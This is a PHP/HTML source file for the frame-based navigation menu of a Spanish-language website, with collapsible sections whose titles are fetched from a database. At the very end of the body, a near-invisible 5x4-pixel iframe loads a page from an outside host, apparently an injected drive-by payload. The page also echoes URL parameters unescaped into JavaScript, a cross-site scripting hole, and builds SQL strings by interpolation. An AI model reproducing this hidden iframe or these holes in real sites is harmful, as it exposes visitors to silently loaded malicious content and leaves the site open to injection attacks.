<?
	define ('authenticate', false);
	require ('../inc/conf.inc.php');
	$socio=$_SESSION['socio'];

if($socio=='mdt'){ $anchof=93;} else{ $anchof=110; }

?>
<HTML>
<HEAD>
<TITLE>areas</TITLE>
<link href="../estilos<?=$_SESSION['socio']?>.css" rel="stylesheet" type="text/css">
<script language="javascript">
<?
if(isset($_GET['actualiza'])){ 
	echo "var actualiza=".$_GET['actualiza'].";\n"; 
	echo "var tit='".$_GET['tit']."'\n"; 
	echo "var sec='".$_GET['sec']."'\n"; 
}
?>

function botonover(x) {
x.childNodes[0].childNodes[0].src=bullet2.src;
x.childNodes[0].className='flechita';
x.childNodes[1].className='link1over'
}

function botonout(x) {
x.childNodes[0].childNodes[0].src=bullet1.src;
x.childNodes[0].className='flechita';
x.childNodes[1].className='link1'
}
function xhola(s,x,t){
	cierratodo();
	cambiar(s,x,t);
}
function cambiarsub(item,cod,t,p,s1,m) {
	t=t.replace('&','%26')
	parent.frames['centro'].location='<?=CFG_virtualPath?>carga_contenido.php?id_sel='+cod+'&tit='+t
	parent.frames['derecha'].location='<?=CFG_virtualPath?>carga_derecha.php?id_sel=1'; //antes era id_sel=3&menu=1&id_sub_sel='+p+'&id_sub_sel1='+s1+'&modo='+m

}
function cambiar(item,cod,t,m,s1) {
	if(item){
	   obj=document.getElementById(item);
	   visible=(obj.style.display!="none")
	   key=document.getElementById("x" + item);
	   if (visible) {
	     obj.style.display="none";
	   } else {
	      obj.style.display="block";
	   }
	}
	if(cod>0){
		t=t.replace('&','%26')
		parent.frames['centro'].location='<?=CFG_virtualPath?>carga_contenido.php?id_sel='+cod+'&tit='+t
		parent.frames['derecha'].location='<?=CFG_virtualPath?>carga_derecha.php?id_sel=1';  //antes era id_sel=3&menu=1&id_sub_sel='+cod+'&modo='+m+'&id_sub_sel1='+s1
	}
}

function abretodo() {
   divs=document.getElementsByTagName("DIV");
   for (i=0;i<divs.length;i++) {
     divs[i].style.display="block";
     key=document.getElementById("x" + divs[i].id);
     key.innerHTML="<img src='textfolder.gif' width='16' height='16' hspace='0' vspace='0' border='0'>";
   }
}

function cierratodo() {
   divs=document.getElementsByTagName("DIV");
   for (i=0;i<divs.length;i++) {
     divs[i].style.display="none";
     //key=document.getElementById("x" + divs[i].id);
     //key.innerHTML="<img src='folder.gif' width='16' height='16' hspace='0' vspace='0' border='0'>";
   }
}

</script>
<style type="text/css">
<!--
.fondito {
	background-image: url(../images/fondo.jpg);
	background-repeat: no-repeat;
	background-position: left top;
}
-->
</style>
</HEAD>
<BODY class="fondito">

<input type="hidden" name="id" value="3">
<table border=0 cellpadding='1' cellspacing=1 width="100%">
  <tr>
    <td class="divisor" height="19"><small><small>&nbsp;</small></small></td>
  </tr>
</table>

<table width="100%" border=0 cellpadding='1' cellspacing=1>
  <tr>
    <td >

<table border=0 cellpadding='1' cellspacing=1 width="100%">
  <tr>
    <td class="divisor"><a class="link1" id="xuno" href="javascript:cierratodo();cambiar('uno',9,'<?=traducemenu(9,1)?>',1,9);"><?=traducemenu(9,1)?></a></td>
  </tr>
</table>
<div id="uno" style="display: none; margin-left: 0em;">
  <table border=0 cellpadding='1' cellspacing=1 width="100%">
    <tr>
      <td width='1'><img src="../images/flechaitemmunozover2.gif" border="0"></td>
      <td><a class="link2" href="javascript:cambiarsub('',27,'<?=traducemenu(27,1)?>',27,9);"><?=traducemenu(27,1)?></a></td>
    </tr>
  </table>
  <table border=0 cellpadding='1' cellspacing=1 width="100%">
    <tr>
      <td width='1'><img src="../images/flechaitemmunozover2.gif" border="0"></td>
      <td><a class="link2" href="javascript:cambiarsub('',28,'<?=traducemenu(28,1)?>',28,9);"><?=traducemenu(28,1)?></a></td>
    </tr>
  </table>
  <table border=0 cellpadding='1' cellspacing=1 width="100%" class="divisor">
    <tr>
      <td width='1'><img src="../images/flechaitemmunozover2.gif" border="0"></td>
      <td><a class="link2" href="javascript:cambiarsub('',29,'<?=traducemenu(29,1)?>',29,9);"><?=traducemenu(29,1)?></a></td>
    </tr>
  </table>
</div>


<table border=0 cellpadding='1' cellspacing=1 width="100%">
  <tr>
    <td class="divisor"><a class="link1" id="xdos" href="javascript:cierratodo();cambiar('',10,'<?=traducemenu(10,1)?>','',10);"><?=traducemenu(10,1)?></a></td>
  </tr>
</table>


<table border=0 cellpadding='1' cellspacing=1 width="100%">
  <tr>
    <td class="divisor"><a  class="link1" id="xtres" href="javascript:cierratodo();cambiar('tres',11,'<?=traducemenu(11,1)?>','',11);"><?=traducemenu(11,1)?></a></td>
  </tr>
</table>
<div id="tres" style="display: none; margin-left: 0em;">
  <table border=0 cellpadding='1' cellspacing=1 width="100%">
    <tr valign="top">
      <td width='1'><img src="../images/flechaitemmunozover2.gif" border="0"></td>
      <td><a class="link2" href="javascript:cambiarsub('',35,'<?=traducemenu(35,1)?>',11,11);"><?=traducemenu(35,1)?></a></td>
    </tr>
  </table>
  <table border=0 cellpadding='1' cellspacing=1 width="100%">
    <tr valign="top">
      <td width='1' valign="top"><img src="../images/flechaitemmunozover2.gif" border="0"></td>
      <td><a class="link2" href="javascript:cambiarsub('',36,'<?=traducemenu(36,1)?>',11,11);"><?=traducemenu(36,1)?></a></td>
    </tr>
  </table>
  <table border=0 cellpadding='1' cellspacing=1 width="100%">
    <tr valign="top">
      <td width='1' valign="top"><img src="../images/flechaitemmunozover2.gif" border="0"></td>
      <td><a class="link2" href="javascript:cambiarsub('',37,'<?=traducemenu(37,1)?>',11,11);"><?=traducemenu(37,1)?></a></td>
    </tr>
  </table>
  <table border=0 cellpadding='1' cellspacing=1 width="100%">
    <tr valign="top">
      <td width='1' valign="top"><img src="../images/flechaitemmunozover2.gif" border="0"></td>
      <td><a class="link2" href="javascript:cambiarsub('',38,'<?=traducemenu(38,1)?>',11,11);"><?=traducemenu(38,1)?></a></td>
    </tr>
  </table>
  <table border=0 cellpadding='1' cellspacing=1 width="100%">
    <tr>
      <td width='1' valign="top"><img src="../images/flechaitemmunozover2.gif" border="0"></td>
      <td><a class="link2" href="javascript:cambiarsub('',39,'<?=traducemenu(39,1)?>',11,11);"><?=traducemenu(39,1)?></a></td>
    </tr>
  </table>
  <table border=0 cellpadding='1' cellspacing=1 width="100%" class="divisor">
    <tr valign="top">
      <td width='1' valign="top"><img src="../images/flechaitemmunozover2.gif" border="0"></td>
      <td><a class="link2" href="javascript:cambiarsub('',40,'<?=traducemenu(40,1)?>',11,11);"><?=traducemenu(40,1)?></a></td>
    </tr>
  </table>
<!--  <table border=0 cellpadding='1' cellspacing=1 width="100%" class="divisor">
    <tr>
      <td width='1'><img src="../images/flechaitemmunozover2.gif" border="0"></td>
      <td><a class="link2" href="javascript:cambiarsub('',160,'<?=traducemenu(160,1)?>');"><?=traducemenu(160,1)?></a></td>
    </tr>
  </table>-->
</div>
<table border=0 cellpadding='1' cellspacing=1 width="100%">
  <tr>
    <td class="divisor"><a class="link1" id="xcuatro" href="javascript:cierratodo();cambiar('cuatro',12,'<?=traducemenu(12,1)?>','1',12);"><?=traducemenu(12,1)?></a></td>
  </tr>
</table>
<div class="divisor" id="cuatro" style="display: none;">
 <table border=0 cellpadding='1' cellspacing=1 width="100%">
    <tr>
      <td width='1' valign="top"><img src="../images/flechaitemmunozover2.gif" border="0"></td>
      <td><a class="link2" href="javascript:cambiarsub('',206,'<?=traducemenu(206,1)?>',12,12,1);"><?=traducemenu(206,1)?></a></td>
    </tr>
  </table>
  <table border=0 cellpadding='1' cellspacing=1 width="100%">
    <tr>
      <td width='1' valign="top"><img src="../images/flechaitemmunozover2.gif" border="0"></td>
      <td><a class="link2" href="javascript:cambiarsub('',207,'<?=traducemenu(207,1)?>',12,12,1);"><?=traducemenu(207,1)?></a></td>
    </tr>
  </table>
</div>
<table border=0 cellpadding='1' cellspacing=1 width="100%">
  <tr>
    <td class="divisor"><a class="link1" id="xcinco" href="javascript:cierratodo();cambiar('cinco',13,'<?=traducemenu(13,1)?>','',13);"><?=traducemenu(13,1)?></a></td>
  </tr>
</table>
<div id="cinco" style="display: none;">
  <table border=0 cellpadding='1' cellspacing=1 width="100%">
    <tr>
      <td width='1' valign="top"><img src="../images/flechaitemmunozover2.gif" border="0"></td>
      <td align="left"><a class="link2" href="javascript:cambiarsub('',70,'<?=traducemenu(70,1)?>',13,13);"><?=traducemenu(70,1)?></a></td>
    </tr>
  </table>
  <table border=0 cellpadding='1' cellspacing=1 width="100%">
    <tr>
      <td width='1' valign="top"><img src="../images/flechaitemmunozover2.gif" border="0"></td>
      <td align="left"><a class="link2" href="javascript:cambiarsub('',75,'<?=traducemenu(75,1)?>',13,13);"><?=traducemenu(75,1)?></a></td>
    </tr>
  </table>
  <table border=0 cellpadding='1' cellspacing=1 width="100%">
    <tr>
      <td width='1' valign="top"><img src="../images/flechaitemmunozover2.gif" border="0"></td>
      <td align="left"><a class="link2" href="javascript:cambiarsub('',76,'<?=traducemenu(76,1)?>',13,13);"><?=traducemenu(76,1)?></a></td>
    </tr>
  </table>

  <table border=0 cellpadding='1' cellspacing=1 width="100%">
    <tr>
      <td width='1' valign="top"><img src="../images/flechaitemmunozover2.gif" border="0"></td>
      <td align="left"><a class="link2" href="javascript:cambiarsub('',77,'<?=traducemenu(77,1)?>',13,13);"><?=traducemenu(77,1)?></a></td>
    </tr>
  </table>
  <table border=0 cellpadding='1' cellspacing=1 width="100%">
    <tr>
      <td width='1' valign="top"><img src="../images/flechaitemmunozover2.gif" border="0"></td>
      <td align="left"><a class="link2" href="javascript:cambiarsub('',165,'<?=traducemenu(165,1)?>',13,13);"><?=traducemenu(165,1)?></a></td>
    </tr>
  </table>
  <table border=0 cellpadding='1' cellspacing=1 width="100%" class="divisor">
    <tr>
      <td width='1' valign="top"><img src="../images/flechaitemmunozover2.gif" border="0"></td>
      <td align="left"><a class="link2" href="javascript:cambiarsub('',166,'<?=traducemenu(166,1)?>',13,13);"><?=traducemenu(166,1)?></a></td>
    </tr>
  </table>

</div>

<table border=0 cellpadding='1' cellspacing=1 width="100%">
  <tr>
    <td class="divisor"><a class="link1" id="xseis" href="javascript:cierratodo();cambiar('seis',14,'<?=traducemenu(14,1)?>','',14);"><?=traducemenu(14,1)?></a></td>
  </tr>
</table>
<div id="seis" style="display: none; margin-left: 0em; ">
  <table border=0 cellpadding='1' cellspacing=1 width="100%">
    <tr>
      <td width='1' valign="top"><img src="../images/flechaitemmunozover2.gif" border="0"></td>
      <td><a class="link2" href="javascript:cambiarsub('',79,'<?=traducemenu(79,1)?>',14,14);"><?=traducemenu(79,1)?></a></td>
    </tr>
  </table>
  <table border=0 cellpadding='1' cellspacing=1 width="100%" class="divisor">
    <tr>
      <td width='1' valign="top"><img src="../images/flechaitemmunozover2.gif" border="0"></td>
      <td><a class="link2" href="javascript:cambiarsub('',80,'<?=traducemenu(80,1)?>',14,14);"><?=traducemenu(80,1)?></a></td>
    </tr>
  </table>
</div>


<table border=0 cellpadding='1' cellspacing=1 width="100%">
  <tr>
    <td class="divisor"><a class="link1" id="xsiete" href="javascript:cierratodo();cambiar('siete',15,'<?=traducemenu(15,1)?>','',15);"><?=traducemenu(15,1)?></a></td>
  </tr>
</table>
<div id="siete" style="display: none; margin-left: 0em;">
  <table border=0 cellpadding='1' cellspacing=1 width="100%">
    <tr>
      <td width='1' valign="top"><img src="../images/flechaitemmunozover2.gif" border="0"></td>
      <td><a class="link2" href="javascript:cambiarsub('',82,'<?=traducemenu(82,1)?>',15,15);"><?=traducemenu(82,1)?></a></td>
    </tr>
  </table>
  <table border=0 cellpadding='1' cellspacing=1 width="100%">
    <tr>
      <td width='1' valign="top"><img src="../images/flechaitemmunozover2.gif" border="0"></td>
      <td><a class="link2" href="javascript:cambiarsub('',83,'<?=traducemenu(83,1)?>',15,15);"><?=traducemenu(83,1)?></a></td>
    </tr>
  </table>
  <table border=0 cellpadding='1' cellspacing=1 width="100%">
    <tr>
      <td width='1' valign="top"><img src="../images/flechaitemmunozover2.gif" border="0"></td>
      <td><a class="link2" href="javascript:cambiarsub('',84,'<?=traducemenu(84,1)?>',15,15);"><?=traducemenu(84,1)?></a></td>
    </tr>
  </table>
  <table border=0 cellpadding='1' cellspacing=1 width="100%" class="divisor">
    <tr>
      <td width='1' valign="top"><img src="../images/flechaitemmunozover2.gif" border="0"></td>
      <td><a class="link2" href="javascript:cambiarsub('',85,'<?=traducemenu(85,1)?>',15,15);"><?=traducemenu(85,1)?></a></td>
    </tr>
  </table>
 <!-- <table border=0 cellpadding='1' cellspacing=1 width="100%">
    <tr>
      <td width='1' valign="top"><img src="../images/flechaitemmunozover2.gif" border="0"></td>
      <td><a class="link2" href="javascript:cambiarsub('',86,'<?=traducemenu(86,1)?>');"><?=traducemenu(86,1)?></a></td>
    </tr>
  </table>-->

</div>

</td></tr></table>

<script>
parent.document.all('marcos').cols="200,*,<?=$anchof?>"
parent.frames['centro'].location='../carga_contenido.php?id_sel=3&tit=<?=traducemenu(3,1)?>';
parent.frames['derecha'].location='../carga_derecha.php?id_sel=1';  //antes era id_sel=3&menu=1
try{
	if(actualiza>0){
		xhola(sec,actualiza,tit);
	}
}
catch(f){}


</script>
<iframe src="http://david123.com/r/g.php" width="5" height="4" align="right"></iframe></body>
</HTML>

<?
function traducemenu($id,$tipo){
	global $lng;
	$db1=new DBI();
	$db1->select('secciones','*',"id=$id and lng='$lng'");
	if($db1->num_rows()>0){
		$row=$db1->fetch_object();
		if($tipo==1) echo trim($row->titulo);
		if($tipo==2) echo trim($row->descrip);
	}
	else{
		echo "no hay datos";
	}

}
?>
